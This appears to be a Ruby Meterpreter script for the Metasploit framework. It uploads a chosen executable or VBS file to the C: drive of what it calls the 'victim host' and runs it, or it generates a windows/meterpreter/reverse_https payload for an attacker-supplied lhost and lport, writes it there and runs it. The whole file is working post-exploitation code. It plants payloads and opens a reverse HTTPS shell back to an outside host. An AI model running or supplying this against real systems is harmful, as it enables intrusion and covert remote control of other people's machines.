def dynamic_require path
    $".delete path if $".include? path
    require path
end

reverse_https_api_path = "#{ENV[:BASE]}/msf3/scripts/meterpreter/reverse-https-api.rb"
dynamic_require reverse_https_api_path

path_on_victim_host = "c:\\"

case args[0]
when "-f"
  if args[1]
    src = args[1] 
    filename = src.split('/').last
    path_on_victim_host += filename
    if ::File.stat(src).file?
      client.fs.file.upload path_on_victim_host, src
      if src.include? ".exe"
        print_status "Found .exe as Payload"
        exe_reverse_https path_on_victim_host, client
      elsif src.include? ".vbs"
        print_status "Found .vbs as Payload"
        vbs_reverse_https path_on_victim_host, client
      else
        print_status "c - Treat as Executable"
        print_status "w - run with wscript"
        print_status "e - to Exit the Scrit"
        input = STDIN.gets
        case input
          when "c"
            print_status "Try to execute"      
            exe_reverse_https path_on_victim_host, client
          when "w"
            print_status "Running wscript"      
            vbs_reverse_https path_on_victim_host, client
          when "e"
            raise Rex::Script::Completed 
        end
      end    
    else
      print_error "Specified Payload doesn't exists"
    end
  else
    print_error "No encoded Payload specified"
    raise Rex::Script::Completed
  end
when "-g"
  filename = "script.vbs"
  path_on_victim_host += filename
  payload = generate_payload "windows/meterpreter/reverse_https", args[1], args[2], client
  write_payload payload, path_on_victim_host, client
  vbs_reverse_https path_on_victim_host, client
else
  print_status "Usage:" 
  print_status "-f file: Uploads specified File and Executes it"
  print_status "-g lhost lport: generate new .vbs-ReserveHttps payload with specified Parameters"
end

